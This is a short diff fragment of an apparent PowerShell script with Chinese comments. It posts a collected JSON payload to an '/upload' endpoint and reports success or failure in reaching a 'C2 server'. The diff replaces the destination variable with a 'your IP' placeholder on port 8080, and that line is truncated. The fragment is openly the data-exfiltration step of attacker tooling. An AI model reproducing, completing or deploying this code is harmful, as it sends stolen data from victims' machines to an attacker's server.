@@ -13,7 +13,7 @@ $payload = @{
 
 try {
     # 使用 HTTP POST 傳送 JSON
-    Invoke-RestMethod -Uri "http://$destinationIP/upload" -Method Post -Body $payload -ContentType "application/json"
+    Invoke-RestMethod -Uri "http://<你的IP>:8080/upload" -Method Post ...
     Write-Host "[+] 數據回傳成功。" -ForegroundColor Green
 } catch {
     Write-Host "[-] 回傳失敗: 無法連接到 C2 伺服器。" -ForegroundColor Red
